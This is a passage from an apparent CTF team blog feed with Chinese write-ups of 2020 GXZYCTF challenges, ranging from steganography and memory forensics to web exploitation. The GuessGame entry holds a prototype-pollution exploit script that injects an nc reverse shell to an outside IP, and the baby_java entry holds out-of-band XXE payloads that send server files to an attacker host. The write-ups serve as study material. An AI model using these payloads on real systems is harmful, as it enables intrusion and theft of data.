    <link href="https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/"/>
    <id>https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/</id>
    <published>2020-03-17T05:54:17.000Z</published>
    <updated>2020-03-21T12:26:55.713Z</updated>
    
    <content type="html"><![CDATA[<p>binwalk分析一下</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/image-20200321202605726.png" alt="image-20200321202605726"></p><p>存在图片和一个rar压缩包，提取压缩包，里面是一个flag.exe的执行文件，打开后尝试输入发现，每输入六行就会返回一串字符串，猜测应该是需要输入特定的六个字符会返回flag；</p><p>使用steghide工具对图片进行分析</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/clip_image004.jpg" alt="IMG_256"></p><p>发现确实存在隐藏信息，但是需要密码，爆破~！</p><p>密码是“ctf”</p><p>得到flag.txt</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/clip_image006-1584793461286.jpg" alt="IMG_256"></p><p>打开flag.exe</p><p>输入“ ‘ 武 汉 加 油 ! ”得到flag</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/clip_image008.jpg" alt="IMG_257"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;binwalk分析一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/image-20200321202605726.png&quot; alt=&quot;image-20200321202605726&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Misc" scheme="https://boiteam.github.io/categories/Misc/"/>
    
    
      <category term="-Misc_代码分析" scheme="https://boiteam.github.io/tags/Misc-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF ez_mem&amp;usb</title>
    <link href="https://boiteam.github.io/2020/03/17/2020_GXZCTF_ez_mem&amp;usb/"/>
    <id>https://boiteam.github.io/2020/03/17/2020_GXZCTF_ez_mem&amp;usb/</id>
    <published>2020-03-17T05:54:17.000Z</published>
    <updated>2020-03-21T12:00:30.686Z</updated>
    
    <content type="html"><![CDATA[<p>Binwalk分离出一个压缩包，解开得data.vmem文件</p><p>Volatility分析</p><p>得到flag.img文件</p><p><img src="/2020/03/17/2020_GXZCTF_ez_mem&usb/clip_image002.jpg" alt="微信图片_20200321005339"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Binwalk分离出一个压缩包，解开得data.vmem文件&lt;/p&gt;
&lt;p&gt;Volatility分析&lt;/p&gt;
    
    </summary>
    
    
      <category term="Misc" scheme="https://boiteam.github.io/categories/Misc/"/>
    
    
      <category term="Misc_隐写" scheme="https://boiteam.github.io/tags/Misc-%E9%9A%90%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF GuessGame</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_GuessGame/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_GuessGame/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:31:30.800Z</updated>
    
    <content type="html"><![CDATA[<p>看到log函数里面有merge，那么可以原型链污染了</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function <span class="keyword">log</span>(<span class="keyword">user</span>Info)&#123;</span><br><span class="line">    let <span class="keyword">log</span>Item = &#123;<span class="string">"time"</span>:new Date().<span class="keyword">to</span>String()&#125;;</span><br><span class="line">    merge(<span class="keyword">log</span>Item,<span class="keyword">user</span>Info);</span><br><span class="line">    loginHistory.push(<span class="keyword">log</span>Item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后post/路由中调用了log</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//So terrible code~</span><br><span class="line">app.post(<span class="string">'/'</span>,<span class="keyword">function</span> (req, res) &#123;</span><br><span class="line">    <span class="keyword">if</span>(typeof req.body.<span class="keyword">user</span>.username != "string")&#123;</span><br><span class="line">        res.<span class="keyword">end</span>("error");</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        //console.log(req.body.<span class="keyword">user</span>.username);</span><br><span class="line">        <span class="keyword">if</span>(config.forbidAdmin &amp;&amp; req.body.<span class="keyword">user</span>.username.includes("admin"))&#123;</span><br><span class="line">            res.<span class="keyword">end</span>("any admin user has been baned");</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(req.body.<span class="keyword">user</span>.username.toUpperCase() === adminName.toUpperCase())</span><br><span class="line">                //<span class="keyword">only</span> <span class="keyword">log</span> <span class="keyword">admin</span><span class="string">'s activity</span></span><br><span class="line"><span class="string">                log(req.body.user);</span></span><br><span class="line"><span class="string">            res.end("ok");</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br></pre></td></tr></table></figure><p>需要满足输入的username的大写要等于 “admin888”的大写，利用javascript的大小写特性，就可以绕过，然后试了试之前ejs模板的反弹shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"><span class="attribute">url</span>=<span class="string">"http://121.37.167.12"</span></span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>=requests.post(url,json=&#123;<span class="string">"user"</span>:&#123;<span class="string">"username"</span>:<span class="string">"admIn888"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"enableReg"</span>:True,<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 144.34.200.151 9999 &gt;/tmp/f ');var __tmp2"</span>&#125;&#125;&#125;,<span class="attribute">proxies</span>=proxy)</span><br><span class="line"><span class="builtin-name">print</span> r.text</span><br><span class="line"><span class="attribute">r</span>=requests.get(url,proxies=proxy)</span><br><span class="line"><span class="builtin-name">print</span> r.textimport requests</span><br><span class="line"><span class="attribute">url</span>=<span class="string">"http://121.37.167.12"</span></span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>=requests.post(url,json=&#123;<span class="string">"user"</span>:&#123;<span class="string">"username"</span>:<span class="string">"admIn888"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"enableReg"</span>:True,<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 144.34.200.151 9999 &gt;/tmp/f ');var __tmp2"</span>&#125;&#125;&#125;,<span class="attribute">proxies</span>=proxy)</span><br><span class="line"><span class="builtin-name">print</span> r.text</span><br></pre></td></tr></table></figure><p>反弹shell成功，<code>cat app.js</code></p><p><img src="/2020/03/09/2020_GXZYCTF_GuessGame/image-20200309222006644.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看到log函数里面有merge，那么可以原型链污染了&lt;/p&gt;
&lt;figure class=&quot;highlight pf&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function &lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Info)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    let &lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;Item = &amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;time&quot;&lt;/span&gt;:new Date().&lt;span class=&quot;keyword&quot;&gt;to&lt;/span&gt;String()&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    merge(&lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;Item,&lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Info);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    loginHistory.push(&lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;Item);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="JS" scheme="https://boiteam.github.io/categories/Web/JS/"/>
    
    
      <category term="Web_原型链污染" scheme="https://boiteam.github.io/tags/Web-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
      <category term="Web_ReDos盲注" scheme="https://boiteam.github.io/tags/Web-ReDos%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF baby_java</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_baby_java/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_baby_java/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:17:53.175Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311132610679.png" alt></p><p>很酷炫，然后比赛就是不会做，burp截包可以看到这里用了xml格式来读取输入的数据，可以xxe，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">xxe</span>  <span class="meta-string">"bbbbb"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311140115614.png" alt></p><p>可以解析xml，比赛时测试带上&amp;，%就会get out hacker ，以为把&amp;和%都禁了，然后就没有然后了，还是对xxe的理解不够深入，然后继续测试，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"file:///etc/passwd"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311140602422.png" alt></p><p>这里会触发waf,从这也可以看出，触发waf的时候会返回sus waf detect ! get out bad hacker !  hint: /hint.txt，而之前返回get out hacker  可能时因为语法问题等其他原因，这里过滤了file和ftp等，而且提示我们去读hint.txt，然后尝试外带xxe，<a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">这里参考</a></p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311140334086.png" alt></p><p>开始看其他的wp上面说有用http读取了hint.txt，而且内容为pom.xml文件，以为是多行的，看了上面这篇文章后，http是不能读多行文件的，然后问了出题人<a href="https://www.cnblogs.com/tr1ple/" target="_blank" rel="noopener">tr1ple</a>师傅，hint.txt是单行的，那么http和ftp应该都可以读了，</p><p>这里我们服务器放的hint.txt如下</p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311141839708.png" alt></p><ul><li>http</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"http://ip/gx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%xxe;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">//gx.dtd</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///hint.txt"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999/?%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%int;</span></span><br><span class="line"><span class="perl">%send;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311141959966.png" alt></p><ul><li>ftp</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"http://ip/gxzy.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%xxe;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">//gxzy.dtd</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://ip:2121/%payload;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%int;</span></span><br><span class="line"><span class="perl">%trick;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311142521849.png" alt></p><p>按照比赛来这时我们得到了pom.xml文件，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Method%uFF1A post</span><br><span class="line">Path %uFF1A /you_never_know_the_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.tr1ple<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>baby_java<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>saxpath<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saxpath<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-FCS<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flex.blazeds<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flex-messaging-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span 